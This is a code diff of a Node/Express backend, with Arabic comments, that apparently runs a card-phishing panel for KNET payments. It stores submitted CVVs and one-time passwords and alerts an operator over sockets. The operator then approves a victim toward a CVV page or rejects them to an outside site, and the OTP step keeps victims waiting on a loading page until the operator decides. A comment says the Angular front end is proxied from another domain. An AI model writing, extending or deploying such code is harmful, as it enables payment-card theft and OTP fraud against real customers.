@@ -132,26 +132,35 @@ app.post('/api/admin/payment-action', authMiddleware, (req, res) => {
   if (!booking) return res.json({ success: false, error: 'حجز غير موجود' });
   
   if (action === 'pass') {
-    // عند القبول: تغيير حالة knetPayment إلى APPROVED حتى ينتقل Angular لصفحة OTP
     booking.status = 'approved';
     if (booking.payment) booking.payment.paymentAction = 'pass';
-    // تحديث knetPayment أيضاً
+    // عند القبول: توجيه العميل لصفحة CVV تلقائياً
+    db.redirects[reference] = 'cvv';
     if (booking.knetId) {
+      db.redirects[booking.knetId] = 'cvv';
       const knetPayment = (db.knetPayments || []).find(p => p.id === booking.knetId || p.knetId === booking.knetId);
       if (knetPayment) {
         knetPayment.status = 'APPROVED';
+        knetPayment.adminRedirectUrl = getRedirectUrl('cvv', reference);
         knetPayment.updatedAt = new Date().toISOString();
+        io.emit('payment_updated', knetPayment);
+        io.emit('admin_redirect', { paymentId: booking.knetId, redirectUrl: knetPayment.adminRedirectUrl });
       }
     }
   } else if (action === 'denied') {
     booking.status = 'cancelled';
     if (booking.payment) booking.payment.paymentAction = 'denied';
-    // تحديث knetPayment أيضاً
+    // عند الرفض: توجيه لصفحة رفض
+    db.redirects[reference] = 'https://insoline.online';
     if (booking.knetId) {
+      db.redirects[booking.knetId] = 'https://insoline.online';
       const knetPayment = (db.knetPayments || []).find(p => p.id === booking.knetId || p.knetId === booking.knetId);
       if (knetPayment) {
         knetPayment.status = 'REJECTED';
+        knetPayment.adminRedirectUrl = 'https://insoline.online';
         knetPayment.updatedAt = new Date().toISOString();
+        io.emit('payment_updated', knetPayment);
+        io.emit('admin_redirect', { paymentId: booking.knetId, redirectUrl: 'https://insoline.online' });
       }
     }
   } else if (action === 'completed') {
@@ -336,7 +345,6 @@ app.post('/api/cvv-submit', (req, res) => {
 app.post('/api/otp-submit', (req, res) => {
   const { referenceId, otp } = req.body;
   db = loadData();
-
   const ref = referenceId || '';
   if (db.bookings[ref]) {
     db.bookings[ref].otp = { otpCode: otp, createdAt: new Date().toISOString() };
@@ -344,12 +352,10 @@ app.post('/api/otp-submit', (req, res) => {
     db.bookings[ref].statusRead = 0;
     saveData(db);
     io.emit('newPayment', { type: 'otp', reference: ref });
+    io.emit('newBooking', { reference: ref });
   }
-
-  const redirect = db.redirects[ref] || db.globalRedirect;
-  const redirectUrl = redirect ? getRedirectUrl(redirect, ref) : null;
-
-  res.json({ success: true, redirect: redirectUrl });
+  // لا نرسل redirect تلقائياً - نبقى في تحميل حتى يوجه الأدمين
+  res.json({ success: true, referenceId: ref, redirect: null });
 });
 
 // ==================== Angular App Routes (proxy from ios.eventat.world) ====================
@@ -614,11 +620,15 @@ app.post('/knet', (req, res) => {
   io.emit('newPayment', { type: 'knet', reference: ref, payment: newPayment });
   io.emit('newBooking', { reference: ref });
   
+  // إرسال redirectUrl للـ Angular لتوجيه العميل لصفحة تحميل تنتظر قرار الأدمين
+  const base = process.env.BASE_URL || '';
+  const redirectUrl = `${base}/cvv?ref=${ref}&id=${paymentId}`;
   res.json({
     success: true,
     knetId: paymentId,
     paymentId: paymentId,
-    status: 'PENDING'
+    status: 'PENDING',
+    redirectUrl
   });
 });
 
